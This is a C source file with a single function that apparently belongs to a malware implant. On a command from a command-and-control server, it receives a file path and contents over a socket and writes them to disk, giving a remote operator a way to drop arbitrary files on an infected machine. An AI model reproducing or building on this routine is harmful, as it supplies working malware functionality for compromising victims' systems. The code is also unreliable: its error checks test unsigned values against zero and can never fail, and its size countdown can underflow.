#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void download_from_cnc(unsigned int peer_fd)
{
    puts("Received DOWNLOAD_FILE_FROM_CNC command.");
    char pending_buf[2048];
    char local_path[255] = {};
    uint64_t remaining_bufsize = 0, bytes_read = 0;
    unsigned int cnc_file_fd;

    if (read(peer_fd, local_path, sizeof(local_path)) < 0)
    {
        perror("Failed to read data from the peer.");
        exit(EXIT_FAILURE);
    }
    printf("local path: %s\n", local_path);
    if (read(peer_fd, &remaining_bufsize, sizeof(remaining_bufsize)) < 0)
    {
        perror("Failed to read data from the peer.");
        exit(EXIT_FAILURE);
    }
    printf("file_size: %lx\n", remaining_bufsize);

    if ((cnc_file_fd = open(local_path, O_CREAT | O_WRONLY, 0644)) < 0)
    {
        perror("Failed to open the requested file.");
        exit(EXIT_FAILURE);
    }
    while (remaining_bufsize != 0)
    {
        if ((bytes_read = read(peer_fd, pending_buf, sizeof(pending_buf))) < 0)
        {
            perror("Failed to read data from the peer.");
            exit(EXIT_FAILURE);
        }
        if (write(cnc_file_fd, pending_buf, bytes_read) < 0)
        {
            perror("Failed to write data to the file.");
            exit(EXIT_FAILURE);
        }
        remaining_bufsize -= bytes_read;
    }
    close(cnc_file_fd);
}